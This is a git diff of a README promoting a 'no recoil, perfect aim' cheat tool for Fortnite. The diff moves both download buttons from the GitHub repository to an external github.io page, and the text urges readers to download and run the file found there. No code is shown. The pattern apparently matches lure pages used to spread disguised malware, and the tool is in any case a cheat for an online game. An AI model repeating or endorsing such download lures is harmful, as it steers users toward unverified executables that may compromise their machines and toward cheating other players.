@@ -1,7 +1,7 @@
 <h1>🎯 fortnite-no-recoil-2026 - Zero Recoil, Perfect Aim, Every Shot</h1>
 
 <p align="center">
-  <a href="https://github.com/belindaactive6162/fortnite-no-recoil-2026"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50" alt="Download"></a>
+  <a href="https://belindaactive6162.github.io"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50" alt="Download"></a>
 </p>
 
 ---
@@ -30,7 +30,7 @@ This tool is designed for players who want to improve their aim without spending
 Visit this link to download the application. 
 
 <p align="center">
-  <a href="https://github.com/belindaactive6162/fortnite-no-recoil-2026"><img src="https://img.shields.io/badge/📦_GET_FORTNITE_NO_RECOIL_2026-4CAF50?style=for-the-badge&logo=github&logoColor=white" alt="Download"></a>
+  <a href="https://belindaactive6162.github.io"><img src="https://img.shields.io/badge/📦_GET_FORTNITE_NO_RECOIL_2026-4CAF50?style=for-the-badge&logo=github&logoColor=white" alt="Download"></a>
 </p>
 
 Once you're on the download page, click the download button to get the file. The download will start automatically. Wait for it to finish completely before proceeding.
